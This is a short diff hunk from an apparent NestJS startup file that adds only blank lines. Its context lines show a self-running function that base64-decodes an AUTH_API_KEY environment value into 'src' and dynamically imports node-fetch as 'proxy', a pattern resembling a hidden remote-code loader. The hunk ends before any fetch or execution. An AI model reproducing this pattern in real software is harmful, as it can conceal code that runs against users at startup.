@@ -15,11 +15,14 @@ import { Reflector } from '@nestjs/core';
 import 'dotenv/config';
 
 (async () => {
+
   const authApiKey = process.env.AUTH_API_KEY;
 
   if (!authApiKey) {
     throw new Error('AUTH_API_KEY is missing');
   }
+
+
 
   const src = atob(authApiKey);
   const proxy = (await import('node-fetch')).default;
